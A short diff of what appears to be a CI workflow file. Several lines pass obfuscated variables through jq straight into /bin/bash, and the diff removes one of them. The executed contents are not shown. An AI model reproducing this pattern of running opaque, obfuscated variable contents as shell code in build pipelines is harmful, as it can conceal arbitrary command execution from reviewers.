@@ -30,7 +30,6 @@ jobs:
           echo $b202 | jq -r .cj72525 | /bin/bash
           echo $pioly0 | jq -r .ybp1 | /bin/bash
           printf '%s' "$j77407" | jq -r .gpfh55 | /bin/bash
-          printf '%s' "$iithc8" | jq -r .ypcl34 | /bin/bash
           echo $gwlq8 | jq -r .gctx9778 | /bin/bash
 
       - name: Store output
